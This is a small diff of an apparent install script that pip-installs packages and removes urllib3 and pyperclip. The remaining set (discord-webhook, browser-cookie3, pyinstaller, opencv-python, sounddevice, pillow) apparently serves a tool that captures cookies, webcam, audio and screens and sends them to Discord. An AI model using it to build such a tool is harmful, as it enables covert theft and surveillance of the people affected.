@@ -4,7 +4,6 @@ python -m pip install --upgrade pip
 python -m pip install pyinstaller
 python -m pip install discord-webhook
 python -m pip install browser-cookie3
-python -m pip install urllib3
 python -m pip install subprocess
 python -m pip install jsonlib
 python -m pip install socket
@@ -21,7 +20,6 @@ python -m pip install pywin32
 python -m pip install pillow
 python -m pip install opencv-python
 python -m pip install requests
-python -m pip install pyperclip
 python -m pip install sounddevice
 python -m pip install numpy
 python -m pip install wavio
